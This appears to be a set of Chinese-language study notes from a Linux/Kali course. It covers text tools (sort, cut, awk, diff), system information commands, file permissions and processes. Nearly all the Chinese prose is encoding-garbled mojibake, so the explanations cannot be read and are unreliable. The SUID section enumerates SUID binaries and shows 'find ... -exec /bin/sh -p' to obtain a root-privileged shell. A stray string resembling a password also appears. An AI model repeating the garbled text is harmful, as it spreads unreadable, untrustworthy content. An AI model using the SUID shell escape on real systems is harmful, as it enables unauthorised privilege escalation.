sortå‘½ä»¤å°†è¾“å…¥æ–‡ä»¶çœ‹åšç”±å¤šæ¡è®°å½•ç»„æˆçš„æ•°æ®æµï¼Œè€Œè®°å½•ç”±å¯å˜å®½åº¦çš„å­—æ®µç»„æˆï¼Œè®°å½•ä¹‹é—´ä»¥æ¢è¡Œç¬¦ä½œä¸ºå®šç•Œç¬¦ï¼Œsortå‘½ä»¤ä¸awkä¸€æ ·ï¼Œå¯å°†è®°å½•åˆ†æˆå¤šä¸ªåŸŸï¼ˆå­—æ®µï¼Œfieldï¼‰è¿›è¡Œå¤„ç†ï¼Œé»˜è®¤çš„åŸŸåˆ†éš”ç¬¦æ˜¯ç©ºæ ¼ï¼Œä¹Ÿå¯ä»¥ç”±ç”¨æˆ·è‡ªè¡Œå®šä¹‰

sortæ¯”è¾ƒåŸåˆ™æ˜¯ä»é¦–å­—ç¬¦å‘åä¾æ¬¡æ¯”è¾ƒ

ç©ºå­—ç¬¦ä¸²<æ•°å€¼<å­—æ¯

å­—æ¯æ˜¯æŒ‰ç…§å­—æ¯è¡¨çš„é¡ºåºæ’åºï¼ŒaAbB
å°å†™å­—æ¯è¦æ’åœ¨å¤§å†™å­—æ¯å‰ï¼ˆ<a<A<b<B<...<z<Zï¼‰
å¦‚æœéƒ½æ˜¯åŒä¸€ä¸ªå­—æ¯ï¼ˆä¸è€ƒè™‘å¤§å°å†™ï¼‰ï¼Œåˆ™æ¯”è¾ƒä¸‹ä¸€çº§ï¼ˆå¦‚a1<A2ï¼‰
æœ€åæŒ‰å‡åºè¾“å‡ºã€‚
-n æŒ‰æ•°å­—å¤§å°æ’åº  
-u  åˆ é™¤æ‰€æœ‰é‡å¤è¡Œ
-r  é€†åºæ’åˆ—
-t  æŒ‡å®šåŸŸåˆ†éš”ç¬¦
-k  æŒ‡å®šæ’åºçš„åŸŸ

sort  -k3  -n  -r  -t:  /etc/passwd
sort -k3nr -t: /etc/passwd

ls -l /etc  | sort -k5 -rn | head   


ls -l /etc  | grep -E  -v  "^d|^l"
grep 
	-E  æ‰©å±•æ­£åˆ™è¡¨è¾¾å¼
	-v  åå‘åŒ¹é…
	"^d|^l" è¡¨ç¤ºä»¥då¼€å¤´æˆ–ï¼ˆ|ï¼‰ä»¥lå¼€å¤´
	
ls -l /etc  | grep -E  -v  "^d|^l" | sort -k5 -rn | head 

åœ¨/etc/ç›®å½•ä¸­æ‰¾å‡ºæ–‡ä»¶å¤§å°æ’åœ¨å‰10ä½çš„æ–‡ä»¶
sortå¸¸ç”¨çš„ä¸€ç§ç»„åˆ
   -urn
   


21.2 uniq

ä»ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ä¸­å»é™¤æˆ–ç¦æ­¢é‡å¤è¡Œï¼Œæ³¨ï¼šç›¸é‚»çš„è¡Œ

-c   æ˜¾ç¤ºé‡å¤çš„æ¬¡æ•°


### Day22


22.1 cut

åŠŸèƒ½ï¼šæ–‡æœ¬æˆªå–å·¥å…·ï¼Œæ˜¯ä¸€ä¸ªä»æŒ‡å®šæ•°æ®ä¸­æŠ½å–æŒ‡å®šåˆ—å¹¶å°†å…¶ä»–å†…å®¹æŠ›å¼ƒçš„è¿‡è™‘å™¨
cutç¨‹åºå¯ä»¥æ–¹ä¾¿åœ°é…åˆç®¡é“ä½¿ç”¨ï¼Œé€šå¸¸æŠŠcutå‘½ä»¤ç”¨ä½œç®¡é“ä¸­çš„è¿‡æ»¤å™¨ã€‚
-c  æŒ‰å­—ç¬¦æˆªå–
-d  æŒ‡å®šåŸŸåˆ†éš”ç¬¦
-f  æŒ‡å®šåŸŸçš„å­—æ®µæ•°

æ¯ç§å‚æ•°æ ¼å¼è¡¨ç¤ºèŒƒå›´å¦‚ä¸‹ï¼š
    N     ä»ç¬¬1ä¸ªå¼€å§‹æ•°çš„ç¬¬Nä¸ªå­—èŠ‚ã€å­—ç¬¦æˆ–åŸŸ
    N-    ä»ç¬¬Nä¸ªå¼€å§‹åˆ°æ‰€åœ¨è¡Œç»“æŸçš„æ‰€æœ‰å­—ç¬¦ã€å­—èŠ‚æˆ–åŸŸ
    N-M   ä»ç¬¬Nä¸ªå¼€å§‹åˆ°ç¬¬Mä¸ªä¹‹é—´(åŒ…æ‹¬ç¬¬Mä¸ª)çš„æ‰€æœ‰å­—ç¬¦ã€å­—èŠ‚æˆ–åŸŸ
    -M    ä»ç¬¬1ä¸ªå¼€å§‹åˆ°ç¬¬Mä¸ªä¹‹é—´(åŒ…æ‹¬ç¬¬Mä¸ª)çš„æ‰€æœ‰å­—ç¬¦ã€å­—èŠ‚æˆ–åŸŸ

echo "Hellobaby" | cut -c2
echo "Hello baby" | cut -c7 
echo "Hello baby" | cut -c7-
echo "Hello baby" | cut -c7-9
echo "Hello baby" | cut -c-7 
echo "Hello baby" | cut -c2,7

tail -1 /etc/passwd | cut -d: -f1

22.2 æŒ‘æˆ˜2---WebæœåŠ¡å™¨çš„æ—¥å¿—è¿›è¡Œåˆ†æ
Step01: è§£å‹
gunzip access_log.txt.gz 
Step02 é‡å‘½å
 mv access_log.txt access_log 
Step03 å¿«é€Ÿäº†è§£æ–‡ä»¶ç»“æ„
head access_log  
wc -l access_log  
Step04 æŸ¥æ‰¾è¯·æ±‚çš„IPåœ°å€ï¼Œè¿›è¡Œç»Ÿè®¡åˆ†æ
cat access_log | cut -d " " -f1
cat access_log | cut -d " " -f1  | sort 
cat access_log | cut -d " " -f1  | sort | uniq -c
cat access_log | awk '{print $1}'  | sort | uniq -c
cat access_log | awk '{print $1}'  | sort | uniq -c | sort -nr 
tep05 å¯¹è¯·æ±‚é¢‘ç‡æ¯”è¾ƒé«˜çš„IPåœ°å€çš„HTTPè¯·æ±‚èµ„æºè¿›è¡Œåˆ†æå’Œç»Ÿè®¡
cat access_log | grep '208.68.234.99' | cut -d "\"" -f2 | uniq -c
1038 GET //admin HTTP/1.1
Step06  æ‰¾å‡ºè®¿é—®èµ„æºçš„ä¿¡æ¯å¹¶ä½¿ç”¨sort æ’åºå»é‡æŸ¥çœ‹
cat access_log | grep '208.68.234.99' | grep 'admin' | sort -u   

HTTP 401--æœªæˆæƒè®¿é—®
HTTP 200--è®¿é—®æˆåŠŸ

### Day23
23.1 awk
awkæ˜¯ä¸€ç§ç”¨äºå¤„ç†æ–‡æœ¬çš„ç¼–ç¨‹è¯­è¨€å·¥å…·ï¼Œæ˜¯Unix/LinuxåŠŸèƒ½æœ€å¼ºå¤§çš„æ•°æ®å¤„ç†å¼•æ“ï¼Œ
å¯ä»¥åœ¨åŒ¹é…çš„è¡Œä¸Šæ‰§è¡Œç‰¹æ®Šçš„æ“ä½œï¼Œshellä¸­æœ€å¸¸ç”¨äºæˆªå–æ–‡æœ¬ä¸­æŸä¸€æ®µæ•°æ®ã€‚
åŒæ—¶ä¹Ÿæ˜¯ä¸€ä¸ªæ ¼å¼åŒ–çš„æŠ¥å‘Šç”Ÿæˆå·¥å…·
awkåŸºæœ¬ç»“æ„åŒ…æ‹¬æ¨¡å¼åŒ¹é…(ç”¨äºæ‰¾åˆ°è¦å¤„ç†çš„è¡Œ)å’Œå¤„ç†è¿‡ç¨‹(å³å¤„ç†åŠ¨ä½œ)ã€‚
      awk  pattern  {action}
	  åŒ¹é…æ¨¡å¼â€”â€”æ‰§è¡ŒåŠ¨ä½œ
	  
AWKæ˜¯ä¸€é—¨å¤„ç†æ–‡æœ¬æ–‡ä»¶çš„è¯­è¨€ã€‚å®ƒæŠŠæ–‡ä»¶çœ‹ä½œä¸€ä¸²è®°å½•(record)ï¼Œç¼ºçœæƒ…å†µä¸‹ä¸€è¡Œå³ä¸ºä¸€ä¸ªè®°å½•ã€‚æ¯ä¸€è¡Œåˆè¢«æ‹†æˆè‹¥å¹²åŸŸ(field)ã€‚æˆ‘ä»¬å¯ä»¥æŠŠä¸€è¡Œä¸­çš„ç¬¬ä¸€ä¸ªè¯çœ‹ä½œç¬¬ä¸€åŸŸï¼Œç¬¬äºŒä¸ªè¯çœ‹ä½œç¬¬äºŒåŸŸï¼Œä»¥æ­¤ç±»æ¨ã€‚ä¸€ä¸ªAWKç¨‹åºå°±æ˜¯ä¸€è¿ä¸²â€œæ¨¡å¼â€”â€”åŠ¨ä½œâ€è¯­å¥ã€‚AWKä¸€æ¬¡è¯»å…¥ä¸€è¡Œï¼Œç„¶åå¯¹ç…§ç¨‹åºä¸­çš„å„ä¸ªæ¨¡å¼è¿›è¡Œæ‰«æã€‚ä¸€æ—¦åŒ¹é…æˆåŠŸå°±æ‰§è¡Œç›¸åº”çš„æ“ä½œ(action)


-F   æŒ‡å®šå­—æ®µåˆ†éš”ç¬¦
-v  è®¾å®šä¸€ä¸ªå˜é‡

	 ä½¿ç”¨å˜é‡FSä¹Ÿå¯ä»¥å®šä¹‰å­—æ®µåˆ†éš”ç¬¦
  	 ä½¿ç”¨å•å¼•å·æŠŠawkç¨‹åºæ®µå¼•ç”¨èµ·æ¥

ã€æ¡ˆä¾‹ã€‘

The user $1 home directory is $6


grep false$ passwd | awk -F : '{print "The user " $1 "home directory is " $6}'

awk -F : '/false$/ {print "The user " $1 "home directory is " $6}' /etc/passwd

awk -F : '$7=="/bin/false" {print "The user " $1 "home directory is " $6}' /etc/passwd

awk -v FS=: '$7=="/bin/false" {print "The user " $1 "home directory is " $6}' /etc/passwd

awk -v FS=: '$NF=="/bin/false" {print "The user " $1 "home directory is " $6}' /etc/passwd

å˜é‡NF: å½“å‰è®°å½•çš„fieldä¸ªæ•°

23.2.  Comparing Files--æ–‡ä»¶çš„æ¯”è¾ƒ
ï¼ˆ1ï¼‰comm
é€è¡Œæ¯”è¾ƒå·²æ’åºçš„æ–‡ä»¶æ–‡ä»¶1 å’Œæ–‡ä»¶2

æ¯”è¾ƒä¸¤ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼Œæ˜¾ç¤ºæ¯ä¸ªæ–‡ä»¶å”¯ä¸€çš„è¡Œï¼Œä»¥åŠå®ƒä»¬å…±æœ‰çš„è¡Œã€‚
å®ƒè¾“å‡ºä¸‰ä¸ªç©ºæ ¼-åç§»åˆ—:ç¬¬ä¸€ä¸ªåŒ…å«å¯¹ç¬¬ä¸€ä¸ªæ–‡ä»¶æˆ–å‚æ•°å”¯ä¸€çš„è¡Œ;
ç¬¬äºŒè¡ŒåŒ…å«å¯¹ç¬¬äºŒä¸ªæ–‡ä»¶æˆ–å‚æ•°å”¯ä¸€çš„è¡Œ;
ç¬¬ä¸‰åˆ—åŒ…å«ä¸¤ä¸ªæ–‡ä»¶å…±äº«çš„è¡Œã€‚
nå¼€å…³ï¼Œå…¶ä¸­â€œnâ€æ˜¯1ã€2æˆ–3ï¼Œå¯ä»¥ç”¨æ¥æŠ‘åˆ¶ä¸€ä¸ªæˆ–å¤šä¸ªåˆ—ï¼Œå–å†³äºéœ€è¦ã€‚
  -1            ä¸è¾“å‡ºæ–‡ä»¶1 ç‰¹æœ‰çš„è¡Œ
  -2            ä¸è¾“å‡ºæ–‡ä»¶2 ç‰¹æœ‰çš„è¡Œ
  -3            ä¸è¾“å‡ºä¸¤ä¸ªæ–‡ä»¶å…±æœ‰çš„è¡Œ
ï¼ˆ2ï¼‰diff
é€è¡Œæ¯”è¾ƒ<å„æ–‡ä»¶>ï¼Œè¦å¤æ‚
å®ƒç”¨æ¥æ¯”è¾ƒä¸¤ä¸ªæ–‡æœ¬æ–‡ä»¶çš„å·®å¼‚ï¼Œæ˜¯ä»£ç ç‰ˆæœ¬ç®¡ç†çš„åŸºçŸ³ä¹‹ä¸€
diff -c scan-a.txt scan-b.txt
diff -u scan-a.txt scan-b.txt 

ï¼ˆ3ï¼‰vimdiff
é¦–å…ˆè¦æŠŠå…‰æ ‡å®šä½åœ¨ä¸åŒå¤„ï¼š
do  æŠŠå¦å¤–ä¸€çª—å£ä¸åŒçš„å†…å®¹æ‹¿åˆ°å½“å‰çª—å£
dp  æŠŠå½“å‰çª—å£ä¸åŒçš„å†…å®¹æ‹¿åˆ°å¦å¤–ä¸€ä¸ªçª—å£
]c è·³è½¬åˆ°ä¸‹ä¸€ä¸ªæ”¹å˜
[c è¿”å›åˆ°ä¸Šä¸€ä¸ªæ”¹å˜
[]
ctrl+w  åˆ‡æ¢åˆ°å¦ä¸€çª—å£

ï¼ˆ4ï¼‰meld--æ–‡ä»¶å·®å¼‚æ¯”è¾ƒå·¥å…·
apt-get update && apt-get install meld

### Day24
æ›´æ–°ç³»ç»Ÿ
apt-get update 
apt-get upgrade
æ”¶é›†ç³»ç»Ÿçš„ä¿¡æ¯
date -- æŸ¥çœ‹æ—¥æœŸ
â”Œâ”€â”€(rootğŸ’€kali2)-[~]
â””â”€# date +%F   
2021-10-08

	%F   å®Œæ•´æ—¥æœŸæ ¼å¼
æ¡ˆä¾‹ï¼š
echo "Current time is `å‘½ä»¤`" 
//åå¼•å·ä¸­çš„å‘½ä»¤è¦ä¼˜å…ˆæ‰§è¡Œ
echo "Current time is $(å‘½ä»¤)" 
//$(å‘½ä»¤)---å…¶ä¸­çš„å‘½ä»¤è¦ä¼˜å…ˆæ‰§è¡Œ
echo "Current time is `date +%F`"
å¤‡ä»½æ–‡ä»¶åŠ ä¸Šæ—¥æœŸ
 cp /etc/hosts hosts.bak.$(date +%F)

cal 
æ˜¾ç¤ºå½“å‰æœˆä»½
apt install ncal
-y  æŒ‡å®šå¹´ä»½
-m  æŒ‡å®šæœˆä»½
uptime*****
	uptime  gives  a one line display of the following information.  The current time, how long the system has been running, how many users are currently logged on,
       and the system load averages for the past 1, 5, and 15 minutes.
	   
	å½“å‰çš„æ—¶é—´
	ç³»ç»Ÿå·²ç»è¿è¡Œäº†å¤šé•¿æ—¶é—´
	å½“å‰ç™»å½•ï¼ˆåœ¨çº¿ï¼‰çš„ç”¨æˆ·æ•°
	è¿‡å»1ã€5ã€15åˆ†é’Ÿçš„ç³»ç»Ÿå¹³å‡è´Ÿè½½ï¼ˆload averagesï¼‰
uptime -p 
top åŠ¨æ€æŸ¥çœ‹è¿›ç¨‹
w  æŸ¥çœ‹åœ¨çº¿ç”¨æˆ·
who
tty  æŸ¥çœ‹å½“å‰çš„ç»ˆç«¯
whoami
finger æ˜¾ç¤ºç”¨æˆ·çš„è¯¦ç»†ä¿¡æ¯
 uname -a æ˜¾ç¤ºå†…æ ¸ä¿¡æ¯
cat /proc/cpuinfo æ˜¾ç¤ºCPUä¿¡æ¯

cat /proc/cpuinfo | grep processor

è™šæ‹ŸåŒ–æŒ‡ä»¤é›† VMX

cat /proc/meminfo æ˜¾ç¤ºå†…å­˜ä¿¡æ¯
cat /proc/meminfo  | grep -i ^memtotal  ç‰©ç†å†…å­˜å¤§å°
cat /proc/meminfo  | grep -i ^swaptotal  è™šæ‹Ÿå†…å­˜å¤§å°
 df -h æ˜¾ç¤ºæ–‡ä»¶ç³»ç»Ÿçš„ä½¿ç”¨æƒ…å†µ
 df -h | grep  -w \/
du -sh   ç»Ÿè®¡å½“å‰ç›®å½•å ç”¨ç£ç›˜ç©ºé—´å¤§å°
free  æ˜¾ç¤ºå†…å­˜å’Œäº¤æ¢åˆ†åŒºçš„å¤§å°




























# ç¬”è®°ï¼ˆday25-day36)
### Day25**
æ–‡ä»¶å’Œç›®å½•æƒé™çš„æ§åˆ¶
P e r m i s s i o n s
25.1. Linuxä¸­å¸¸è§çš„æƒé™
rï¼ˆreadï¼‰å…è®¸æŸ¥çœ‹å’Œæ‰“å¼€æ–‡ä»¶
wï¼ˆWriteï¼‰å…è®¸æŸ¥çœ‹å’Œç¼–è¾‘æ–‡ä»¶
xï¼ˆexecuteï¼‰å…è®¸ç”¨æˆ·æ‰§è¡Œæ–‡ä»¶ï¼ˆå¦‚è„šæœ¬ã€äºŒè¿›åˆ¶æ–‡ä»¶ç­‰ï¼‰
ls -ld work
drwxr-xr-x 7 root root 4096  9æœˆ  3 09:47 work

ls -l secretfile
-rw-r--r-- 1 root root    0  9æœˆ 10 10:23 secretfile
1 2        3  4    5      6   7                 8

1----æ–‡ä»¶çš„ç±»å‹
2----æ–‡ä»¶çš„æƒé™
   rw-   r--   ---
   å±ä¸»ï¼ˆUï¼‰  å±ç»„ï¼ˆGï¼‰ å…¶ä»–äººï¼ˆOï¼‰
   rwx   rwx  rwx 
3----é“¾æ¥çš„æ•°ç›®
4---- å±ä¸»
5----å±ç»„
6--- æ–‡ä»¶å¤§å°
7---- æ—¶é—´
8--æ–‡ä»¶å

25.2.  æ›´æ”¹æ–‡ä»¶çš„æƒé™
chmod
 -R, --recursive        é€’å½’ä¿®æ”¹æ–‡ä»¶å’Œç›®å½•
 
ï¼ˆ1ï¼‰Changing Permissions with UGO //è¡¨è¾¾å¼

chmod [é€‰é¡¹]... æ¨¡å¼[,æ¨¡å¼]... æ–‡ä»¶...

u å±ä¸»
g å±ç»„         ï¼ˆ+-=ï¼‰     æ–‡ä»¶
o å…¶ä»–äºº
a æ‰€æœ‰ç”¨æˆ·


chmod u+x  file  //ç»™å±ä¸»æ·»åŠ æ‰§è¡Œæƒé™
chmod u-x file   //æŠŠå±ä¸»æ‰§è¡Œæƒé™å»é™¤
chmod u=x file   //ç»™å±ä¸»èµ‹äºˆæ‰§è¡Œæƒé™ï¼ˆå±ä¸»åªæœ‰æ‰§è¡Œæƒé™ï¼‰


chmod a+w /exam/file   //ç»™æ‰€æœ‰ç”¨æˆ·æ·»åŠ å†™æƒé™
chmod +w /exam/file   //åªæ˜¯ç»™å±ä¸»æ·»åŠ å†™æƒé™
chmod +x /exam/file   //ç»™æ‰€æœ‰ç”¨æˆ·æ·»åŠ æ‰§è¡Œæƒé™


chmod u=rw,g=rw,o=r /exam/file

chmod u+x donnie_script.sh
chmod g+x donnie_script.sh
chmod o+x donnie_script.sh
chmod u+x,g+x donnie_script.sh
chmod a+x donnie_script.sh

ï¼ˆ2ï¼‰Changing Permissions with Decimal Notation //æ•°å­—

chmod [é€‰é¡¹]... å…«è¿›åˆ¶æ¨¡å¼ æ–‡ä»¶...

rï¼ˆreadï¼‰å…è®¸æŸ¥çœ‹å’Œæ‰“å¼€æ–‡ä»¶  4
wï¼ˆWriteï¼‰å…è®¸æŸ¥çœ‹å’Œç¼–è¾‘æ–‡ä»¶ 2
xï¼ˆexecuteï¼‰å…è®¸ç”¨æˆ·æ‰§è¡Œæ–‡ä»¶ 1ï¼ˆå¦‚è„šæœ¬ã€äºŒè¿›åˆ¶æ–‡ä»¶ç­‰ï¼‰


rwx  rwx  rwx 
å±ä¸» å±ç»„ å…¶ä»–äºº

7    0    6
rwx ---   rw-

664  rw-rw-r--
777  rwxrwxrwx
755  rwxr-xr-x
400
600
644
000

25.3 stat æŸ¥çœ‹æ–‡ä»¶çš„è¯¦ç»†ä¿¡æ¯

stat file      
  æ–‡ä»¶ï¼šfile
  å¤§å°ï¼š42              å—ï¼š8          IO å—ï¼š4096   æ™®é€šæ–‡ä»¶
è®¾å¤‡ï¼š801h/2049d        Inodeï¼š2756675     ç¡¬é“¾æ¥ï¼š1
æƒé™ï¼š(0141/---xr----x)  Uidï¼š(    0/    root)   Gidï¼š(    0/    root)
æœ€è¿‘è®¿é—®ï¼š2021-10-09 09:57:48.150117453 +0800
æœ€è¿‘æ›´æ”¹ï¼š2021-10-09 09:57:12.730116333 +0800
æœ€è¿‘æ”¹åŠ¨ï¼š2021-10-09 10:05:17.446131654 +0800
åˆ›å»ºæ—¶é—´ï¼š2021-10-09 09:57:12.730116333 +0800

 stat -c %a file ä»¥æ•°å€¼æ˜¾ç¤ºæ–‡ä»¶çš„æƒé™

### Day26**

26.1. Setting More Secure Default Permissions with Masks
é€šè¿‡umaskè®¾ç½®æ–‡ä»¶ï¼ˆç›®å½•ï¼‰é»˜è®¤æƒé™
Linuxç³»ç»Ÿé»˜è®¤ä¸ºæ–‡ä»¶åˆ†é…çš„æƒé™å¦‚ä¸‹ï¼ˆåŸºæœ¬æƒé™ï¼‰ï¼š
æ–‡ä»¶  666  rw-rw-rw-
      644
ç›®å½•  777  rwxrwxrwx
      755
å¯ä»¥é€šè¿‡umaskæŠŠç›¸åº”çš„æƒé™ä»LinuxåŸºæœ¬æƒé™ä¸­æ©å»

å¯¹äºä¸ªäººç”¨æˆ·ä¹Ÿå¯ä»¥è‡ªå®šä¹‰è‡ªå·±çš„umaskå€¼ï¼Œå»ºè®®å†™åœ¨ç”¨æˆ·å®¶ç›®å½•ä¸­çš„.profileæ–‡ä»¶ä¸­

26.2 æ›´æ”¹æ–‡ä»¶çš„å±ä¸»å’Œå±ç»„
Granting Ownership to an Individual User
 useradd 
  -m, --create-home             åˆ›å»ºç”¨æˆ·çš„ä¸»ç›®å½•
  -M, --no-create-home          ä¸åˆ›å»ºç”¨æˆ·çš„ä¸»ç›®å½•

useradd -m user1
groupadd jn

æŠŠç”¨æˆ·åŠ å…¥åˆ°ç»„
æ–¹æ³•1ï¼š gpasswd

gpasswd -a user1 jn
	-a åŠ å…¥ç»„
	-d ä»ç»„ä¸­ç§»é™¤
æ–¹æ³•2ï¼š usermod 
	usermod -G jn user1

groups 
  æŸ¥çœ‹æ‰€å±çš„ç»„
  
æ›´æ”¹(change)æ–‡ä»¶çš„å±ä¸»(Owner)
chown
	-R  é€’å½’

chown user1 test01 

æ›´æ”¹æ–‡ä»¶çš„å±ç»„

æ–¹æ³•1ï¼šchgrp
	-R  é€’å½’

	chgrp jn test01
æ–¹æ³•2ï¼š
	chown å±ä¸»:å±ç»„  æ–‡ä»¶

	chown :å±ç»„  æ–‡ä»¶


26.3. Special Permissions ç‰¹æ®Šçš„æƒé™
ï¼ˆ1ï¼‰Granting Temporary Root Permissions with SUID
 é€šè¿‡SUIDä½ç»™ç”¨æˆ·ä¸´æ—¶rootæƒé™
 å½“æ‰§è¡Œè®¾ç½®äº†SUIDä½çš„ç¨‹åºæ—¶ï¼Œæ˜¯ä»¥è¯¥ç¨‹åºçš„å±ä¸»èº«ä»½æ‰§è¡Œï¼Œè€Œä¸æ˜¯å½“å‰ç”¨æˆ·
 SUID---å†’é™©ä½â€”4â€”ä½œç”¨äºå±ä¸»
 ls -l /usr/bin/passwd
-rwsr-xr-x 1 root root 63960  2æœˆ  7  2020 /usr/bin/passwd

 Da163.com0
 suid sgid sticky rwx rwx rwx
 4    2     1
 
 chmod u+s /usr/bin/passwd
 chmod 4755 /usr/bin/passwd
 
å¦‚ä½•åœ¨ç³»ç»Ÿä¸­æŸ¥æ‰¾å“ªäº›æ–‡ä»¶è®¾ç½®äº†SUIDä½ï¼Ÿ
find / -perm -u=s -type f   2>/dev/null  
find / -perm -4000 -type f  2>/dev/null *****


find -name f1 -exec ls -l {} \;
 
find -name f1 -exec /bin/sh \; 
find -name f1 -exec /bin/sh -p \;
//-exec  å¯¹æ‰¾åˆ°çš„æ–‡ä»¶æ‰§è¡ŒæŒ‡å®šçš„å‘½ä»¤ï¼Œä»¥;ç»“æŸï¼ˆ;å·å‰è¦åŠ è½¬ä¹‰ç¬¦\ï¼‰
é«˜ç‰ˆæœ¬çš„Linuxä¸­ï¼Œå¦‚æœå¯åŠ¨bashçš„Effectiveï¼ˆæœ‰æ•ˆçš„ï¼‰ UIDä¸Realï¼ˆçœŸå®çš„ï¼‰ UIDä¸ç›¸åŒï¼Œè€Œä¸”æ²¡æœ‰ä½¿ç”¨-på‚æ•°ï¼Œåˆ™bashä¼šå°†Effective UID è¿˜åŸæˆReal UID
find -name f1 -exec /bin/bash  \;

bashçš„Effectiveï¼ˆæœ‰æ•ˆçš„ï¼‰ UID---rootç”¨æˆ·
Realï¼ˆçœŸå®çš„ï¼‰ å¦‚æ™®é€šç”¨æˆ·UID---user01

$ cd /tmp
$ touch f1
$ ls -l f1
-rw-r--r-- 1 user1 user1 0 10æœˆ 10 11:12 f1
$ find -name f1
./f1
$ find -name f1 -exec ls -l {} \;    
-rw-r--r-- 1 user1 user1 0 10æœˆ 10 11:12 ./f1
$ find -name f1 -exec /bin/sh \;
$ find -name f1 -exec /bin/sh -p \;

find / -user root -perm -4000 

æŸ¥æ‰¾suidä½ä¸”å±ä¸»æ˜¯rootç”¨æˆ·çš„æ–‡ä»¶  

### Day27**
27.1. SGID

SGID  2---ä½œç”¨äºå±ç»„
chmod 2755 file
SGIDé’ˆå¯¹å‘½ä»¤ç¨‹åºçš„ä½œç”¨
1.åªæœ‰å¯æ‰§è¡ŒäºŒè¿›åˆ¶ç¨‹åºæ‰èƒ½è®¾ç½®SGIDæƒé™
2.å‘½ä»¤æ‰§è¡Œè€…è¦å¯¹è¯¥ç¨‹åºæ‹¥æœ‰æ‰§è¡Œ(x)æƒé™
3.å‘½ä»¤æ‰§è¡Œè€…åœ¨æ‰§è¡Œç¨‹åºçš„æ—¶å€™,ç»„èº«ä»½å‡çº§ä¸ºè¯¥å¯æ‰§è¡Œç¨‹åºæ–‡ä»¶çš„å±ç»„
4.SGIDæƒé™åªåœ¨è¯¥ç¨‹åºæ‰§è¡Œè¿‡ç¨‹ä¸­æœ‰æ•ˆ,ä¹Ÿå°±æ˜¯ç»„èº«ä»½åªåœ¨ç¨‹åºæ‰§è¡Œè¿‡ç¨‹ä¸­å‘ç”Ÿæ”¹å˜,å‘½ä»¤ç»“æŸç”¨æˆ·ç»„èº«ä»½æ¢å¤.

å¦‚æœä¸€ä¸ªç›®å½•è®¾ç½®äº†SGIDä½ï¼Œåˆ™ç›®å½•ä¸­æ–°äº§ç”Ÿçš„æ–‡ä»¶éƒ½ä¼šç»§æ‰¿ç›®å½•çš„å±ç»„èº«ä»½*****

SGIDé’ˆå¯¹ç›®å½•çš„ä½œç”¨
1.æ™®é€šç”¨æˆ·å¿…é¡»å¯¹è¯¥ç›®å½•æ‹¥æœ‰rxæƒé™,æ‰èƒ½è¿›å…¥æ­¤ç›®å½•
2.æ™®é€šç”¨æˆ·åœ¨è¯¥ç›®å½•ä¸­çš„æœ‰æ•ˆç»„ä¼šå˜æˆè¯¥ç›®å½•çš„å±ç»„
3.è‹¥æ™®é€šç”¨æˆ·å¯¹æ­¤ç›®å½•æ‹¥æœ‰
å°ç»ƒä¹ 
groupadd security 
chgrp security /exam   
chmod g+s /exam  
ls -ld /exam   
touch /exam/f9 
cp /etc/hosts /exam 
ls -l /exam

chmod g+s /exam
chmod 2755 /exam
find / -perm -4000 -type f 2>/dev/null 
åœ¨ç³»ç»Ÿä¸­æŸ¥æ‰¾è®¾ç½®äº†sgidä½çš„ç›®å½•
find / -perm -2000 -type d 2>/dev/null 
åœ¨ç³»ç»Ÿä¸­æŸ¥æ‰¾è®¾ç½®äº†sgidä½çš„æ–‡ä»¶
find / -perm -2000 -type f 2>/dev/null 
find / -perm -4000 -type f 2>/dev/null

find / -perm 2000 -type f 2>/dev/null 
åœ¨ç³»ç»Ÿä¸­æŸ¥æ‰¾è®¾ç½®äº†suidä½æˆ–sgidä½çš„æ–‡ä»¶ï¼Ÿ

find 
	é€»è¾‘æˆ– -o (meaning logical OR) ï¼Œæ¡ä»¶åªè¦æ»¡è¶³å…¶ä¸­ä¹‹ä¸€å³å¯
	é€»è¾‘ä¸ and -a (meaning logical AND) ï¼Œé»˜è®¤ï¼Œæ¡ä»¶å¿…é¡»éƒ½è¦æ»¡è¶³

find / -perm -2000 -o -perm -4000 -type f 2>/dev/null 
find / -type f \( -perm -4000 -o -perm 2000 \) 2>/dev/null
find / -perm -6000 -type f 2>/dev/null 
åœ¨ç³»ç»Ÿä¸­ç›‘è§†æ–‡ä»¶æƒé™çš„å˜åŒ–ï¼Œå¦‚å‘ç°ç³»ç»Ÿä¸­æœ‰æ— å¼‚å¸¸çš„suidä½æˆ–sgidä½çš„ç¨‹åºï¼Ÿ
find / -perm -2000 -o -perm -4000 -type f 2>/dev/null >suid_sgid_1.txt


27.2. The Outmoded Sticky Bitï¼ˆç²˜è¿ä½ï¼‰

Stick  ç²˜è¿ä½ 1  ä½œç”¨äºå…¶ä»–äºº
chmod o+t  dir
é€šå¸¸ç”¨äºç›®å½•ï¼ˆå…¬å…±çš„ç›®å½•ï¼‰ï¼Œæ¯ä¸ªäººåªç®¡ç†è‡ªå·±çš„æ–‡ä»¶ï¼Œä½†rootç”¨æˆ·é™¤å¤–
find / -perm -1000 -type d  2>/dev/null
ls -ld /tmp        
drwxrwxrwt 16 root root 4096 10æœˆ 11 10:11 /tmp
                                                         

27.3. è¿›ç¨‹ç®¡ç†
è¿›ç¨‹åªæ˜¯ä¸€ä¸ªæ­£åœ¨è¿è¡Œå’Œä½¿ç”¨èµ„æºçš„ç¨‹åºã€‚è¿›ç¨‹çš„ç®¡ç†åŒ…æ‹¬ï¼š
æŸ¥çœ‹
æŸ¥æ‰¾
å‘ç°å ç”¨ç³»ç»Ÿèµ„æºæ¯”è¾ƒå¤šçš„è¿›ç¨‹
ç®¡ç†åå°çš„è¿›ç¨‹
è¿›ç¨‹ä¼˜å…ˆçº§çš„è°ƒæ•´
ç»“æŸè¿›ç¨‹
è¿›ç¨‹è°ƒåº¦ï¼ˆå‘¨æœŸï¼‰æ‰§è¡Œ

ï¼ˆ1ï¼‰Viewing Processes--è¿›ç¨‹çš„æŸ¥çœ‹
1ï¼‰ps

 ps - report a snapshot of the current processes.

2ï¼‰ps  aux //æŸ¥çœ‹æ‰€æœ‰è¿›ç¨‹çš„è¯¦ç»†ä¿¡æ¯
initè¿›ç¨‹ï¼ˆsystemdï¼‰ æ˜¯ç³»ç»Ÿè°ƒç”¨çš„ç¬¬ä¸€ä¸ªè¿›ç¨‹ï¼Œç¼–å·ä¸º1ï¼Œä¹Ÿæ˜¯æ‰€æœ‰è¿›ç¨‹çš„çˆ¶è¿›ç¨‹

